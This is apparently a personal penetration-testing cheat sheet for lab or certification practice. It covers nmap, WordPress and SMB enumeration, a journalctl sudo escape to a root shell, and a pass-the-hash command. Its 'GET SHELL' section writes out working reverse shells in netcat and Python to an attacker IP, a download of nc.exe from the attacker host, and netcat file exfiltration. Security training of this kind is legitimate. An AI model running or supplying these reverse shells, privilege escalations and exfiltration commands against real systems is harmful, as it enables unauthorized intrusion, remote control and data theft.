# RECON
## Initial Nmap Scan
```bash
nmap -Pn -sC -sV -oA nmap $ip
```

## Enumeration Checklists
https://github.com/theonlykernel/enumeration/wiki
https://medium.com/oscp-cheatsheet/oscp-cheatsheet-6c80b9fa8d7e

## WPscan for wordpress
```bash
wpscan --disable-tls-checks --url $url
```

## Samba
```bash
auxiliary/scanner/smb/smb_version
nmblookup -A $ip
smbclient -L $ip
```

## dirbuster
wordlist: /usr/share/wordlists/dirb/common.txt
URL to fuzz (find file in unknown folder)
/{dir}/phpbash.min.php

## Gobuster HTTP Enumeration
```bash
./gobuster dir -u $url -w /usr/share/wordlists/dirb/common.txt
```





# GENERAL
## Kali Configuration
```bash
## set keyboard layout
setxkbmap -layout de
# set timezone
sudo dpkg-reconfigure tzdata
```

## Find without errors
```bash
find / -name test.py 2>/dev/null
```

## Save all Terminal Output to File
https://unix.stackexchange.com/questions/200637/save-all-the-terminal-output-to-a-file
```bash
# Convert RAW Output to TXT
cat $SCRIPT_LOG_FILE | perl -pe 's/\e([^\[\]]|\[.*?[a-zA-Z]|\].*?\a)//g' | col -b > $txtfile
```

## NTFS Alternate Datastream
```bash
# show alternate datastreams
dir /R

# output alternate datastreams
powershell Get-Content -Path "hm.txt" -Stream "root.txt"
```
# PRIVESC
## LinEnum.sh
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

## GTFOBIns
https://gtfobins.github.io/ 

## journalctl
```bash
# size termain windows very small
usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
!/bin/sh
# whoami
root
```

## Pass-the-Hash spawn CMD
```bash
pth-winexe -U$domain/$username%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //$ip cmd
```

# GET SHELL
## Netcat Windows
```bash
powershell wget "http://[KALI-IP]/windows-resources/binaries/nc.exe" -outfile nc.exe
nc.exe -e cmd.exe [KALI-IP] 1234

#on Kali listen with
nc -nvlp 1234
```

## Transfer Files
```bash
# listen on kali with
nc -lp 1235 > [FILENAME]

# transfer file on victim
nc.exe -w 3 [KALI-IP] 1235 <[FILENAME]
```

## Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.29",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
```
```bash
# make shell better
python -c 'import pty; pty.spawn("/bin/bash");' 
#on Kali listen with
nc -nvlp 1234
```
